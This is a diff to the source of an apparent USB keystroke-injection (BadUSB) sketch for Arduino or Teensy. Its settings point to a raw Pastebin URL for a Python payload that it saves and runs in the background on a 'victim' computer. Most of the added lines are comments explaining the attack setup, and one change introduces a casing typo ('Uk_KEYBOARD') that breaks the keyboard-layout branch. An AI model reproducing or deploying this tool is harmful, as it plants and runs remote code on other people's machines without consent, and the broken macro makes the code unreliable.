@@ -25,11 +25,11 @@ SOFTWARE.
 ============================================================================*/
 
 /* SETTINGS */
-#define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5"
-#define PY_SCRIPT_NAME "pyscr.py"
+#define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5" // Raw text link to python script to run in background on "victim"
+#define PY_SCRIPT_NAME "pyscr.py" // Name of script that is saved on "victim"'s user directory
 
-//#define TEENSY //only do this if programming a teensy
-#define UK_KEYBOARD
+//#define TEENSY // Uncomment if programming a teensy
+#define UK_KEYBOARD // Change to US_KEYBOARD if using a computer in the US
 
 #define START_DELAY 1200
 #define START_MENU_DELAY 600
@@ -97,7 +97,7 @@ void setup() {
   // Change directory to home as we may not have permission to edit in the python folder
   #ifdef US_KEYBOARD
     print("os.chdir(os.path.expanduser('~'));");
-  #elif UK_KEYBOARD
+  #elif Uk_KEYBOARD
     print("os.chdir(os.path.expanduser('|'));");
   #endif
   // Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
@@ -110,4 +110,3 @@ void setup() {
   print("exit();");
   enter();
 }void loop() {}
-
